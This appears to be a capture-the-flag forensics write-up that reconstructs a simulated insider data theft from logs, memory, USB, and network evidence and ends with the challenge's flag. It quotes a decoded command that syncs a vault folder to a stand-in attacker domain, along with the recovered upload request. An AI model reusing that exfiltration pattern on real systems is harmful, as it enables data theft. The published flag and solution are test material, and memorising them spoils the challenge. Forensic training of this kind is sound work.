---
title: "CRUSH WORKSTATION UPDATE"
ctf: "GoPWNIt"
date: 2026-10-10
category: forensics
difficulty: hard
points: 100
flag_format: "GPI{md5_hex_digest}"
author: "nomadrai"
---

# CRUSH WORKSTATION UPDATE

Challenge author: **bhaiya_ji**.

## Summary

Correlate workstation, mobile, cloud, memory, USB, and network evidence to reconstruct an insider-assisted exfiltration. Memory contains the XOR keys needed to decode a concealed USB plan and the network request, independently confirming the threat actor's case ID.

## Solution

### Step 1: Establish the insider, tool, timestamp, and size

All 24 evidence files pass the supplied SHA-256 manifest. The account `cferguson` maps to **Christine Ferguson** in `employee_list.csv`; both duplicate account rows use that same name.

The process creation event at `2026-09-28T07:52:32` in `workstation_artifacts/Windows_Event_Logs/Security.json` contains a PowerShell `-EncodedCommand`. Base64-decoding it as UTF-16LE reveals:

```text
MEGASYNC.exe sync C:\Vault\ CDN-LEDGER.INVALID:/leak --password j9YEzGdi)FXf
```

The executable and execution time are corroborated by Amcache, simulated Prefetch, the USN journal, and the recent-document shortcut. The cloud audit and storage access logs show the same account accessing the customer vault at that time, with **316669952 bytes**:

```text
316669952 / 1024 / 1024 = 302
```

Use **302MB**, as required by the challenge's size format. The later system-time-change event at `08:04:32` is explicitly marked as a decoy; the original transfer timestamp agrees across independent logs.

### Step 2: Decode the USB plan and corroborating network request

ASCII strings in `memory_dump/memory.raw` reveal three decoding clues:

| Offset | Clue |
|---|---|
| `0x70d1a49` | `USB format routine applied XOR mask 0x7A` |
| `0x4e0e268` | `exfil_plan encoded with XOR 0x33` |
| `0x25040ff` | `C2 payload obfuscated via XOR 0x42` |

XOR every byte of `usb_image/suspicious_usb.img` with `0x7A`. The result is a TAR archive. Read `.vault_sync/exfil_plan.enc`, XOR its bytes with `0x33`, then Base64-decode:

```text
Exfiltration target: Push customer vault using MEGASYNC to CDN-LEDGER.INVALID. Incident tracking assigned as CASE-3714. Threat coordinator: EXFILKING.
```

The network attachment is classic little-endian Ethernet PCAP despite its `.pcapng` extension. XOR the suspicious TCP payload with `0x42` to recover:

```http
POST /api/v1/vault-sync HTTP/1.1
Host: CDN-LEDGER.INVALID
X-Session-Auth: Q0FTRS0zNzE0
X-Client-ID: TUVHQVNZTkMvMS40LjI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Length: 316669952
Content-Type: application/octet-stream
```

The Base64 header values decode to `CASE-3714` and `MEGASYNC/1.4.2`. This independently corroborates the USB plan and the cloud transfer size. The approximately 7 MB of captured outbound payload in Zeek is smaller than the declared transfer size, so it is not the requested vault size.

The mobile messages also name `MEGASYNC`, `CDN-LEDGER.INVALID`, and `EXFILKING`. The leak-site mirror identifies `EXFILKING` as its operator.

### Step 3: Construct and hash the exact incident string

| Field | Value |
|---|---|
| Insider | `CHRISTINE_FERGUSON` |
| Threat alias | `EXFILKING` |
| Tool | `MEGASYNC.EXE` |
| Domain | `CDN-LEDGER.INVALID` |
| Date | `2026-09-28` |
| Time | `07-52-32` |
| Size | `302MB` |
| Case ID | `CASE-3714` |

The live challenge's raw description specifies underscores between **every** field:

```text
DARK_LEDGER_<INSIDER_NAME>_<THREAT_ALIAS>_<TOOL>_<DOMAIN>_<DATE>_<TIME>_<SIZE>_<CASE_ID>
```

Those separators were absent from the initially copied description, causing the first candidate to be rejected. Hash these corrected ASCII bytes with **no trailing newline**:

```text
DARK_LEDGER_CHRISTINE_FERGUSON_EXFILKING_MEGASYNC.EXE_CDN-LEDGER.INVALID_2026-09-28_07-52-32_302MB_CASE-3714
```

The complete runnable solver is [solve.py](solve.py). It verifies the supplied hashes, decodes the USB plan and network request, cross-checks the account, timestamp, size, and client, then prints the incident string and flag. It uses Python 3's standard library only.

From this challenge directory, with the attachment extracted into `evidence/`, run:

```bash
python solve.py
```

## Flag

```text
GPI{8693ed3b5531e91f0b24e27b814f6baa}
```

Submitted successfully on 2026-10-10. The platform returned **"Flag accepted."**, **100 points**, and **#23 Solve**. The challenge was also confirmed in the account's solved list. See [submission_result.json](submission_result.json) for the acceptance response.
